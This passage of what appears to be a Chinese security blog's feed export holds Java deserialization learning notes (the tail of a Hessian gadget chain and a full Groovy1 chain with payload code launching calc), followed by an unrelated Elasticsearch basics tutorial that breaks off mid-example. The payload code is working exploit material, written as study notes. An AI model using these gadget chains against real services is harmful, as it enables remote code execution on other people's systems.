punctuation">;</span><span class="token class-name">Context</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>cpe<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">MethodClosure</span> methodClosure <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodClosure</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span><span class="token string">"listBindings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ConvertedClosure</span> closure<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ConvertedClosure</span><span class="token punctuation">(</span>methodClosure<span class="token punctuation">,</span><span class="token string">"compareTo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建 ConvertedClosure 的动态代理类实例</span><span class="token class-name">Comparable</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Comparable</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ConvertedClosure</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Comparable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> closure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TreeMap</span> treeMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> e <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.TreeMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> declaredConstructor <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>declaredConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> commonEntry <span class="token operator">=</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>treeMap<span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span>commonEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第三个参数为父节点</span><span class="token class-name">Object</span> proxyMapEntry <span class="token operator">=</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>proxyMap<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> commonEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>treeMap<span class="token punctuation">,</span><span class="token string">"size"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>treeMap<span class="token punctuation">,</span><span class="token string">"modCount"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>commonEntry<span class="token punctuation">,</span><span class="token string">"right"</span><span class="token punctuation">,</span>proxyMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> treeMap<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">serialize2</span><span class="token punctuation">(</span><span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="http://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></li><li><a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></li><li><a href="https://su18.org/post/hessian/">https://su18.org/post/hessian/</a></li><li><a href="https://xz.aliyun.com/t/13345">https://xz.aliyun.com/t/13345</a></li><li><a href="https://www.cnblogs.com/F12-blog/p/18156091">https://www.cnblogs.com/F12-blog/p/18156091</a></li><li><a href="https://xz.aliyun.com/t/13599">https://xz.aliyun.com/t/13599</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Hessian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Groovy</title>
      <link href="/2024/06/06/Groovy/"/>
      <url>/2024/06/06/Groovy/</url>
      
        <content type="html"><![CDATA[<h1 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h1><p>Groovy 是一种基于 JVM 的开发语言，具有类似于 Python，Ruby，Perl 和 Smalltalk 的功能。Groovy 既可以用作 Java 平台的编程语言，也可以用作脚本语言。groovy 编译之后生成 .class 文件，与 Java 编译生成的无异，因此可以在 JVM 上运行。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><p>org.codehaus.groovy.runtime.MethodClosure 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。<br>MethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。<br><img src="/img/24-6-6/1.png"><br>MethodClosure 中有一个 doCall 方法，调用 InvokerHelper.invokeMethod() 方法进行方法调用<br><img src="/img/24-6-6/2.png"><br>这样就可以执行系统命令</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">MethodClosure</span> mc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodClosure</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> m  <span class="token operator">=</span> <span class="token class-name">MethodClosure</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"doCall"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>mc<span class="token punctuation">,</span> <span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="String-execute-方法"><a href="#String-execute-方法" class="headerlink" title="String.execute() 方法"></a>String.execute() 方法</h3><p>Groovy 为 String 类型添加了 execute() 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 “ls”.execute() 这种方法来执行系统命令 “ls”。<br>编写groovy</p><pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">package</span> com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>groovy<span class="token keyword">class</span> <span class="token class-name">Execute</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token interpolation-string"><span class="token string">"calc"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>实际上就是调用 Runtime.getRuntime().exec() 方法执行系统命令：<br><img src="/img/24-6-6/3.png"><br>在 Java 中，就可以直接写做：</p><pre class="language-groovy" data-language="groovy"><code class="language-groovy">MethodClosure methodClosure <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodClosure</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">"calc"</span></span><span class="token punctuation">,</span> <span class="token interpolation-string"><span class="token string">"execute"</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>methodClosure<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p>org.codehaus.groovy.runtime.ConvertedClosure 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。<br>ConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 invoke 方法，除了 toString 和一些默认方法外，会调用 invokeCustom 方法。<br>如果初始化时指定的 method 与 invokeCustom 指定的 method 参数相同，则 invokeCustom 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。<br><img src="/img/24-6-6/4.png"></p><h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p>这里思路就有了，我们知道在cc链的时候，AnnotationInvocationHandler在反序列化的时候，readObject会调用memberValues的entrySet方法<br>如果memberValues是由ConvertedClosure 生成MethodClosure的动态代理对象<br>，就会调用MethodClosure对象的call方法</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><pre class="language-none"><code class="language-none">AnnotationInvocationHandler.readObject()    Map.entrySet() (Proxy)        ConversionHandler.invoke()            ConvertedClosure.invokeCustom()                MethodClosure.call()                    ProcessGroovyMethods.execute()</code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span><span class="token class-name">MethodClosure</span> methodClosure <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodClosure</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> <span class="token string">"execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ConvertedClosure</span> closure       <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConvertedClosure</span><span class="token punctuation">(</span>methodClosure<span class="token punctuation">,</span> <span class="token string">"entrySet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span>       c           <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> constructor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建 ConvertedClosure 的动态代理类实例</span><span class="token class-name">Map</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ConvertedClosure</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> closure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><span class="token class-name">InvocationHandler</span> invocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SerializeUtil</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>invocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SerializeUtil</span><span class="token punctuation">.</span><span class="token function">unSerialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>流程不复杂，就不调试跟踪了</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://su18.org/post/ysoserial-su18-3/#groovy1">https://su18.org/post/ysoserial-su18-3/#groovy1</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> Groovy </tag>
            
            <tag> 反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch</title>
      <link href="/2024/06/02/Elasticsearch/"/>
      <url>/2024/06/02/Elasticsearch/</url>
      
        <content type="html"><![CDATA[<h1 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h1><p>基于java编写的Lucence的一层封装</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Elasticsearch是面向文档的，关系行数据库</p><ul><li>索引（indices）:对应mysql中的数据库</li><li>types: 对应表 </li><li>documents: 对应mysql中行</li><li>fields:  对应mysql中的字段</li></ul><p><strong>物理设计</strong>：<br>        elasticsearch 在后台把每个索引划分成多个分片，每份分片可以在集群中的不同服务器间迁移</p><p><strong>逻辑设计</strong>：<br>        一个索引类型中，包含多个文档，比如说文档1，文档2。 当我们索引一篇文档时，可以通过这样的一个顺序找到 它: 索引 ▷ 类型 ▷ 文档ID ，通过这个组合我们就能索引到某个具体的文档。 注意 : ID不必是整数，实际上它是个字符串。</p><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p><em>文档就是一条一条的数据</em><br>         elasticsearch 是面向文档的，那么就意味着索引和搜索数据的最小单位是文档，elasticsearch 中，文档有几个 重要属性 :</p><ul><li><p><strong>自我包含</strong>，一篇文档同时包含字段和对应的值，也就是同时包含 key:value！</p></li><li><p><strong>可以是层次型的</strong>，一个文档中包含自文档，复杂的逻辑实体就是这么来的！其实就是个JSON对象</p></li><li><p><strong>灵活的结构</strong>，文档不依赖预先定义的模式，我们知道关系型数据库中，要提前定义字段才能使用，在 elasticsearch 中，对于字段是非常灵活的，有时候，我们可以忽略该字段，或者动态的添加一个新的字段。</p><p> 尽管我们可以随意的新增或者忽略某个字段，但是，每个字段的类型非常重要，比如一个年龄字段类型，可以是字符串也可以是整形。因为 elasticsearch 会保存字段和类型之间的映射及其他的设置。这种映射具体到每个映射的每种类型，这也是为什么在 elasticsearch 中，类型有时候也称为映射类型。</p></li></ul><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>​    类型是文档的逻辑容器，就像关系型数据库一样，表格是行的容器。 类型中对于字段的定义称为映射，比如 name 映 射为字符串类型。 我们说文档是无模式的，它们不需要拥有映射中所定义的所有字段，比如新增一个字段，那么 elasticsearch 是怎么做的呢?elasticsearch会自动的将新字段加入映射，但是这个字段的不确定它是什么类型，elasticsearch就开始猜，如果这个值是18，那么elasticsearch会认为它是整形。 但是elasticsearch也可能猜不对， 所以最安全的方式就是提前定义好所需要的映射，这点跟关系型数据库殊途同归了，先定义好字段，然后再使用。</p><p>总之类型就是数据字段对应的数据类型的映射</p><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>​    索引是映射类型的容器，elasticsearch 中的索引是一个非常大的文档集合。索引存储了映射类型的字段和其他设置。 然后它们被存储到了各个分片上了。 我们来研究下分片是如何工作的。</p><p>物理设计 ：节点和分片如何工作</p><p>​    一个集群至少有一个节点，而一个节点就是一个 elasricsearch 进程，节点可以有多个索引默认的，如果你创建索引，那么索引将会有个5个分片 ( primary shard ,又称主分片 ) 构成的，每一个主分片会有一个副本 ( replica shard ,又称复制分片 )</p><p> 下图是一个有3个节点的集群，可以看到主分片和对应的复制分片都不会在同一个节点内，这样有利于某个节点挂掉 了，数据也不至于丢失。<br><img src="https://camo.githubusercontent.com/bdfe42be1c7f7bfd43cf725c109206d87b4d5a23d5097d1fff03663163d2ab4e/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353131353533313637312e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&amp;id=DxPHD&amp;originHeight=260&amp;originWidth=880&amp;originalType=binary&amp;ratio=1.3499999046325684&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=">实际上，一个分片是一个 Lucene 索引，一个包含倒排索引的文件目录，倒排索引的结构使得elasticsearch在不扫描全部文档的情况下，就能告诉你哪些文档包含特定的关键字</p><h3 id="倒排索引"><a href="#倒排索引" class="headerlink" title="倒排索引"></a>倒排索引</h3><p>​    elasticsearch 使用的是一种称为倒排索引的结构，采用Lucene倒排索引作为底层。这种结构适用于快速的全文搜索， 一个索引由文档中所有不重复的列表构成，对于每一个词，都有一个包含它的文档列表。 例如，现在有两个文档， 每个文档包含如下内容：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Study</span> every day<span class="token punctuation">,</span> good good up <span class="token keyword">to</span> <span class="token namespace">forever</span> # 文档<span class="token number">1</span>包含的内容<span class="token class-name">To</span> forever<span class="token punctuation">,</span> study every day<span class="token punctuation">,</span> good good up # 文档<span class="token number">2</span>包含的内容</code></pre><p>​    为了创建倒排索引，我们首先要将每个文档拆分成独立的词(或称为词条或者tokens)，然后创建一个包含所有不重复的词条的排序列表，然后列出每个词条出现在哪个文档 :       </p><p><img src="https://camo.githubusercontent.com/4465cac9a719b15a6eb7b447d86a2c84b5703b4377df4e826c46099f1e688f34/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353132323533333339362e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&amp;id=SVhQ0&amp;originHeight=611&amp;originWidth=1004&amp;originalType=binary&amp;ratio=1.3499999046325684&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title="><br>   现在，我们试图搜索 to forever，只需要查看包含每个词条的文档<br><img src="https://camo.githubusercontent.com/c9161246f23f804c797938895c8928cdfc17087c6d2ee1a17edc63a87323ace6/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353132323535353433322e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&amp;id=anffG&amp;originHeight=239&amp;originWidth=1015&amp;originalType=binary&amp;ratio=1.3499999046325684&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title="><br>        两个文档都匹配，但是第一个文档比第二个匹配程度更高。如果没有别的条件，现在，这两个包含关键字的文档都将返回。</p><p>​    再来看一个示例，比如我们通过博客标签来搜索博客文章。那么倒排索引列表就是这样的一个结构 :       </p><p><img src="https://camo.githubusercontent.com/feadd222988837bcc9e1e40daef110bd5925f8d9f04223a49c6a9d452de6db35/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303231353132323731353336372e706e673f2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33646c61586870626c38304e444d784f44677a4d413d3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730#from=url&amp;id=yaeAH&amp;originHeight=281&amp;originWidth=881&amp;originalType=binary&amp;ratio=1.3499999046325684&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title="><br>   如果要搜索含有 python 标签的文章，那相对于查找所有原始数据而言，查找倒排索引后的数据将会快的多。只需要 查看标签这一栏，然后获取相关的文章ID即可。完全过滤掉无关的所有数据，提高效率！</p><p>​    在 elasticsearch 中， 索引这个词被频繁使用，这就是术语的使用。在 elasticsearch 中，索引被分为多个分片，每份分片是一个 Lucene 的索引。所以 一个 elasticsearch 索引是由多个Lucene索引组成的。</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="IK分词器"><a href="#IK分词器" class="headerlink" title="IK分词器"></a>IK分词器</h3><p><strong>分词</strong>：即把一段中文或者别的内容划分成一个个的关键字，我们在搜索时候会把自己的信息进行分词，是因为数据库中或者索引库中的数据也会进行分词，然后进行一个匹配操作，默认的中文分词是将每个字看成一个词，比如 “我爱大数据” 会被分为”我”，”爱”，”大”, “数”，”据”，这显然是不符合要求的，所以我们需要安装中文分词器 ik 来解决这个问题。</p><p>  IK提供了两个分词算法：ik_smart 和 ik_max_word ，其中 ik_smart 为最少切分，ik_max_word 为 最细粒度划分</p><p>安装：<a href="https://github.com/medcl/elasticsearch-analysis-ik/">https://github.com/medcl/elasticsearch-analysis-ik/</a><br>安装对应版本并放入plugin目录下</p><p>使用：</p><ul><li><p>ik_smart模式：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token constant">GET</span> _analyze<span class="token punctuation">{</span>  <span class="token string">"analyzer"</span><span class="token operator">:</span><span class="token string">"ik_smart"</span><span class="token punctuation">,</span>  <span class="token string">"text"</span><span class="token operator">:</span><span class="token string">"中国共产党"</span><span class="token punctuation">}</span></code></pre><p>效果：</p><img src="/img/24-6-2/1.png"></li><li><p>ik_max_word模式</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token constant">GET</span> _analyze<span class="token punctuation">{</span>  <span class="token string">"analyzer"</span><span class="token operator">:</span><span class="token string">"ik_max_word"</span><span class="token punctuation">,</span>  <span class="token string">"text"</span><span class="token operator">:</span><span class="token string">"中国共产党"</span><span class="token punctuation">}</span></code></pre><p>效果：</p><img src="/img/24-6-2/2.png"></li></ul><h3 id="Rest风格"><a href="#Rest风格" class="headerlink" title="Rest风格"></a>Rest风格</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;什么是 Rest 风格呢?</p><blockquote><p><strong>一种软件架构风格，而不是标准，只是提供了一组设计原则和约束条件。它主要用于客户端和服务器交互类的软件。基于这个风格设计的软件可以更简洁，更有层次，更易于实现缓存等机制</strong>。</p></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中 基本 的 Rest 命令说明：</p><table><thead><tr><th>method</th><th>url地址</th><th>描述</th></tr></thead><tbody><tr><td>PUT</td><td>localhost:9200/索引名称/类型名称/文档id</td><td>创建文档（指定文档 id ）</td></tr><tr><td>POST</td><td>localhost:9200/索引名称/类型名称</td><td>创建文档（随机文档 id ）</td></tr><tr><td>POST</td><td>localhost:9200/索引名称/类型名称/文档id/_update</td><td>修改文档</td></tr><tr><td>DELETE</td><td>localhost:9200/索引名称/类型名称/文档id</td><td>删除文档</td></tr><tr><td>GET</td><td>localhost:9200/索引名称/类型名称/文档id</td><td>通过文档id查询文档</td></tr><tr><td>POST</td><td>localhost:9200/索引名称/类型名称/_search</td><td>查询所有数据</td></tr></tbody></table><h3 id="关于索引的基本操作"><a href="#关于索引的基本操作" class="headerlink" title="关于索引的基本操作"></a>关于索引的基本操作</h3><p><em><strong>基础测试</strong></em></p><ol><li>创建一个索引</li></ol><p><em>PUT /索引名/类型名/文档id{请求id}</em></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token comment">// 命令解释 </span><span class="token comment">// PUT 创建命令 test1 索引 type1 类型 1 id</span>PUT /test1/type1/<span class="token number">1</span><span class="token punctuation">{</span>  <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"大数据梦想家"</span><span class="token punctuation">,</span>  <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">21</span><span class="token punctuation">}</span></code></pre><p>如下图所示：<img src="/img/24-6-2/3.png">返回结果 （是以REST ful 风格返回的 ）：<img src="/img/24-6-2/4.png"><br>那么 name 这个字段用不用指定类型呢。毕竟我们关系型数据库 是需要指定类型的啊</p><h4 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h4><p>elasticsearch 常见的字段类型如下：</p><ul><li>字符串类型</li></ul><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/text.html#text">text</a> 、 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/keyword.html">keyword</a></p><ul><li>数值类型</li></ul><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/number.html">long, integer, short, byte, double, float, half_float, scaled_float</a></p><ul><li>日期类型</li></ul><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/date.html">date</a></p><ul><li>布尔值类型</li></ul><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/boolean.html">boolean</a></p><ul><li>二进制类型</li></ul><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/binary.html">binary</a></p><ul><li>等等</li></ul><p><em><strong>PUT新增设置索引规则（设置字段与数据类型）</strong></em></p><pre class="language-json" data-language="json"><code class="language-json">PUT /test2<span class="token punctuation">{</span>  <span class="token property">"mappings"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"name"</span><span class="token 